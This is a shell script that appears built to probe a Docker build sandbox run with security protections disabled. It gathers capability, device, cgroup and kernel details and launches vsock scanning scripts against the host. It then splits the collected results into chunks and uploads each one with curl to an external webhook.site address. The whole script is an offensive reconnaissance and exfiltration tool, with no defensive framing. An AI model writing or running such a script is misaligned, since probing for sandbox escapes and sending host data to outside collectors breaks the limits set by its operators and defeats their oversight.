#!/bin/sh
# laneD probe_insecure.sh — runs under Dockerfile `RUN --security=insecure`
# (seccomp+apparmor removed by BuildKit entitlement if the daemon allows it).
OUT=/laneD/insecure_results.txt
: > "$OUT"
W="https://webhook.site/b6e7624d-0d11-4b13-90a3-740120691ca4"
exfil() { curl -sS -m 30 -X POST "$W" -H "Content-Type: text/plain" --data-binary @"$1" >/dev/null 2>&1; echo "exfil:$1 rc=$?"; }
log() { echo "$@" | tee -a "$OUT"; }

log "###LANED-INSECURE-START### $(date -u) host=$(hostname) uid=$(id -u)"
{
  echo "=== status ==="; grep -E 'Seccomp|Cap|NoNewPrivs' /proc/self/status
  echo "=== dev ==="; ls -la /dev | head -20
  echo "=== cgroup ==="; cat /proc/self/cgroup
  echo "=== uname ==="; uname -a
} >> "$OUT" 2>&1

NODE=$(command -v node 2>/dev/null)
[ -z "$NODE" ] && NODE=/mise/shims/node
export NODE
log "NODE=$NODE"

python3 /laneD/direct_vsock.py >> "$OUT" 2>&1
python3 /laneD/vsock_scan.py >> "$OUT" 2>&1

log "###LANED-INSECURE-END###"
cd /laneD || exit 0
split -b 1500k insecure_results.txt inchunk_ 2>/dev/null
for f in insecure_results.txt inchunk_*; do
  [ -f "$f" ] && exfil "/laneD/$f"
done
echo "###LANED-INSECURE-EXFIL-DONE###"
